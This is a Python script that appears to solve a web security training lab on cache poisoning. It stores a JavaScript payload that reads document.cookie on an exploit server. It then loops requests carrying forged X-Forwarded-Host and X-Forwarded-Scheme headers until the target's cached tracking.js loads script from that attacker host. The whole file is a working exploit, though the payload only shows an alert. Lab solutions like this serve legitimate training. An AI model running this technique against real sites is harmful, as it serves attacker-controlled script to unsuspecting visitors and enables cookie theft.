import requests
import re
from urllib.parse import unquote_plus
import time
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.exploit_server_url = None

    def get_exploit_server_url(self):
        response = self.session.get(self.lab_url, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
        self.exploit_server_url = re.search(r'href=\'(https://exploit-.*?)\'', response.text).group(1)

    def store_payload_on_exploit_server(self):
        data = {
            'urlIsHttps': 'on',
            'responseFile': '/resources/js/tracking.js',
            'responseHead': unquote_plus('HTTP%2F1.1+200+OK%0D%0AContent-Type%3A+application%2Fjavascript%3B+charset%3Dutf-8'),
            'responseBody': 'alert(document.cookie)',
            'formAction': 'STORE'
        }
        self.session.post(self.exploit_server_url, data=data, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)

    def poison_home_page(self):
        headers = {
            'X-Forwarded-Scheme': 'http',
            'X-Forwarded-Host': self.exploit_server_url.replace('https://', '')
        }
        response = self.session.get(self.lab_url + 'resources/js/tracking.js', headers=headers, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
        while True:
            if 'alert(document.cookie)' not in response.text:
                response = self.session.get(self.lab_url + 'resources/js/tracking.js', headers=headers, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
            else:
                break

    def check_solution(self):
        response = self.session.get(self.lab_url, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.get_exploit_server_url()
        self.store_payload_on_exploit_server()
        self.poison_home_page()
        time.sleep(30)
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
